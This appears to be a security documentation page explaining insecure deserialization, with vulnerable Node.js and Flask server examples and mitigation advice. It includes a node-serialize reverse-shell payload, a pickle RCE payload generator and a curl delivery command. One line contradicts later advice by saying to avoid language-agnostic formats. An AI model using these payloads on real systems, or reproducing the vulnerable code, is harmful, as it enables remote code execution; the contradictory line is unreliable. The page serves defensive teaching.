---

Title: "Insecure Deserialization"
linkTitle: "Insecure Deserialization"
weight: 660
description: >
  Insecure Deserialization is one of the OWASP Top 10 web vulnerabilities for 2017. OWASP has included this issue in the [OWASP Top 10:2021](https://owasp.org/Top10/) vulnerabilities as [Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/).
---

{{% pageinfo %}}

Deserialization is one of several [Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/). It can potentially expose your data into "a structure that an attacker can see and modify."

{{% /pageinfo %}}

Before we can describe security issues in this article, we should define serialization and deserialization.

## What is Serialization?

In serialization, we convert an object to a byte stream. We can then send that data over a network or save it on a disk. Serialization is common with Machine Learning data. We can send pre-trained models to other systems. One common example is the pickle.dumps() function in Python3.

Sample code:
```python
import pickle
my_dict = {"Name": "John Doe", "Age": 25, "Score": 80.3}
serialized_data = pickle.dumps(my_dict)
print(serialized_data)
```

Output:

```
b'\x80\x04\x950\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x04Name\x94\x8c\x08John Doe\x94\x8c\x03Age\x94K\x19\x8c\x05Score\x94G@T\x1333333u.'
```

## What is Deserialization?

Deserialization is the opposite of Serialization. It is the process of converting a byte stream into a program object. One common example is the `pickle.loads() function in Python3.

Sample Code: 
```python
import pickle

serialized_data = b'\x80\x04\x950\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x04Name\x94\x8c\x08John Doe\x94\x8c\x03Age\x94K\x19\x8c\x05Score\x94G@T\x1333333u.'
my_dict = pickle.loads(serialized_data)
print(my_dict)
```

Output:
```
{'Name': 'John Doe', 'Age': 25, 'Score': 80.3}
```

![Deserialization diagram from portswigger.net](https://portswigger.net/web-security/images/deserialization-diagram.jpg)

## How can Deserialization be Insecure?

Insecure deserialization occurs when attacker-controlled data flows into the deserialization function. This can lead to "Object Injection" attacks.

Most deserialization attacks are run even before the deserialization process itself is complete.

Native deserialization is insecure. It's best to use of language-agnostic methods for deserialization, such as JSON, XML, or YAML.

Even these libraries can be susceptible to vulnerabilities. For more information, see:

- [CVE-2020-1747](https://nvd.nist.gov/vuln/detail/cve-2020-1747): Vulnerability in the PyYAML library in versions before 5.3.1

- [CVE-2017-5941](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941): Vulnerability in node-serialize package 0.0.4

## Impact of Insecure Deserialization

Insecure deserialization can lead to:
- Object Injection
- Denial of Service
- Tampering of Application Logic by Changing Control Flow
- Remote Code Execution

## What Causes Insecure Deserialization

You may see Insecure Deserialization with external or user-controlled data flows. While you could add checks for user-input, it is difficult address all use cases.

We recommend that you avoid language-agnostic methods for deserialization. In most cases, the libraries used have underlying vulnerabilities and incomplete bug fixes.

You should not deserialize user-controlled data because it can lead to the vulnerabilities listed above.

## Attack Scenarios

You may see deserialization in Machine Learning. Review the following examples of related vulnerabilities:

- [Arbitrary code execution via Insecure YAML deserialization in Nvidia runx](https://huntr.dev/bounties/1-pypi-runx/)
- [Remote Code Execution via Insecure Deserialization in Telerik UI (CVE-2019-18935)](https://hackerone.com/reports/1174185)

We share other vulnerabilities for web applications:

- [Bitbucket Data Center - Java Deserialization Vulnerability In Hazelcast - CVE-2022-26133](https://jira.atlassian.com/browse/BSERV-13173)
- [Confluence Data Center - Java Deserialization Vulnerability In Hazelcast - CVE-2016-10750](https://jira.atlassian.com/browse/BSERV-13173)

We present more scenarios related to insecure deserialization in web applications:

- Direct deserialization of user-controlled data. Example: [CVE-2019-10068](https://nvd.nist.gov/vuln/detail/cve-2019-10068)
- Native vulnerabilities in libraries. Example: [CVE-2020-1747](https://nvd.nist.gov/vuln/detail/cve-2020-1747)
- Improper deserialization of language agnostic methods like XML and JSON data. Example: [CVE-2017-9805](https://nvd.nist.gov/vuln/detail/cve-2017-9805)

In some cases, you can serialize data ito implement authorization and authentication. Consider the following code snippet from [MITRE](https://cwe.mitre.org/data/definitions/502.html):

```python
class ExampleProtocol(protocol.Protocol):  
	def dataReceived(self, data):    
		# Code that would be here would parse the incoming data  
		# After receiving headers, call confirmAuth() to authenticate  

	def confirmAuth(self, headers):  
		try:  
			token = cPickle.loads(base64.b64decode(headers['AuthToken']))  
			if not check_hmac(token['signature'], token['data'], getSecretKey()):  
				raise AuthFail  
			self.secure_data = token['data']  
		except:  
			raise AuthFail

```

Based on this scenario, serialized data is used to authorize a user. Any errors or discrepancies raise an `AuthFail` exception. However, an attacker can use a Base64 encoded deserialization payload. An app would trigger that payload whenever it parses an `AuthToken` header.

## NodeJS
One well-known deserialization vulnerability is shown in a NodeJS application [CVE-2017-5941](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941). The vulnerability exists in the `node-serialize@0.0.4` library and allows attackers to exploit the `unserialize()` function. Attacks can set up arbitrary code execution by passing a JavaScript Object with an Immediately Invoked Function Expression (IIFE).


Consider the following example code:
```js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();

app.use(cookieParser())
app.get('/', function(req, res) {
   if (req.cookies.profile) {
      var str = new Buffer(req.cookies.profile, 'base64').toString();
      var obj = serialize.unserialize(str);

      if (obj.username) {
         res.send( "Hello " + escape(obj.username));
      }
   } else {
      res.cookie('profile', "eyJ1c2VybmFtZSI6ImFkbWluIiwiY29tcGFueSI6ImtvbmR1a3RvIiwibG9jYXRpb24iOiJjbG91ZGJhbmsifQ==" , {
         maxAge: 900000,
         httpOnly: true
      });
      res.send("Hello stranger");
   }
});

app.listen(3000);

```

The above program creates a server that listens on port 3000. In the following excerpt:

```js
var str = new Buffer(req.cookies.profile, 'base64').toString();
var obj = serialize.unserialize(str);
```

The server decodes the base64 encoded cookie and then deserializes it with the `serialize.unserialize()` function. The server code being vulnerable and allows an attacker to execute code remotely.

For example, an attacker can spawn a reverse shell with the following payload:

```
{"rce":"_$$ND_FUNC$$_function() { var net = require('net'); var spawn =
require('child_process').spawn; HOST = \"127.0.0.1\"; PORT = \"1337\";
TIMEOUT = \"5000\"; if (typeof String.prototype.contains === 'undefined') { 
String.prototype.contains = function(it) { return this.indexOf(it) != -1;
}; } function c(HOST, PORT) { var client = new net.Socket();
client.connect(PORT, HOST, function() { var sh = spawn(\"sh\", []);
client.write(\"Connected!\"); client.pipe(sh.stdin);
sh.stdout.pipe(client); sh.stderr.pipe(client); sh.on('exit',
function(code, signal) { client.end(\"Disconnected!\"); }); });
client.on('error', function(e) { setTimeout(c(HOST, PORT), TIMEOUT); }); }
c(HOST, PORT);}( )"}
```

Base64 encoding the above payload and putting it as the cookie value of the request will create a reverse shell to `127.0.0.1` on port `1337`.

## Python

The most common use of deserialization in python is via the `pickle.loads()` function. Consider the following server code:
```python
import pickle
import binascii
from base64 import urlsafe_b64decode
from flask import Flask
from flask import request, jsonify

app = Flask(__name__)


@app.route('/', methods = ['GET', 'POST'])
def user():
    if request.method == 'GET':
        return jsonify({"message":"Hello World!"})

        
    if request.method == 'POST':
        try:
            data = request.form 
            decoded = urlsafe_b64decode(data['payload'])
            username = pickle.loads(decoded) #vulnerable deserialization
            return jsonify({'Hi':username})

        except Exception as e:
            return jsonify({'Hi': 'Stranger'})

if __name__ == '__main__':
    app.run()

```

The server behaves in a similar fashion to the NodeJS example. It listens on port 5000. When a POST request is made to the endpoint, the server tries to decode and deserialize the data to extract a username.

If there are errors, the server responds with a generic message otherwise replies with the name of the user. 

Again, the serialized data is read directly from the request body without any checks. Therefore, it can be exploited easily to gain Remote code execution by generating payloads with the following script:

```python
import pickle
import base64
import os

RCE_CMD = 'touch /tmp/PoC'

class RCE:
    def __reduce__(self):
        cmd = (RCE_CMD)
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

The output, when sent in the POST, executes the noted command on the system.

```bash
$ curl -X POST http://127.0.0.1:5000/ -d "{'payload': 'gASVKQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjA50b3VjaCAvdG1wL1BvQ5SFlFKULg=='}"
```

## Solution

- Do not directly deserialize any user-controlled or untrusted data. For example, take the original code snippet:    

```python
class ExampleProtocol(protocol.Protocol):  
	def dataReceived(self, data):    
		# Code that would be here would parse the incoming data  
		# After receiving headers, call confirmAuth() to authenticate  

	def confirmAuth(self, headers):  
		try:  
			token = cPickle.loads(base64.b64decode(headers['AuthToken']))  # User control data flows into insecure cPickle.loads() function
			if not check_hmac(token['signature'], token['data'], getSecretKey()):  
				raise AuthFail  
			self.secure_data = token['data']  
		except:  
			raise AuthFail
```

In the above example, data from request headers flow directly into the deserialization function, making it vulnerable. 

-   Run untrusted deserialization function inside a sandbox. For example, you can use [nsjail](https://github.com/google/nsjail).
-   Use deserialization methods like JSON, XML, and YAML that are language-agnostic.
-   Use updated libraries, to avoid known security bugs.
-   Limit and check all incoming and outgoing network activity from deserialization containers and servers.

If you're a Java developer, you may need to implement the `serializable` interface due to inheritance. You can override the `readObject()` to prevent actual deserialization. Take the following example from [Snyk](https://snyk.io/)::

```java
private final void readObject(ObjectInputStream in) throws java.io.IOException { 
	throw new java.io.IOException("Deserialized not allowed"); 
}
```
- If you're using PHP, you may need to pass serialized data to the user. In that case, don't use the `unserialize()` function. Use a safe standard data interchange format such as `JSON` (via `json_decode()` and `json_encode()`).
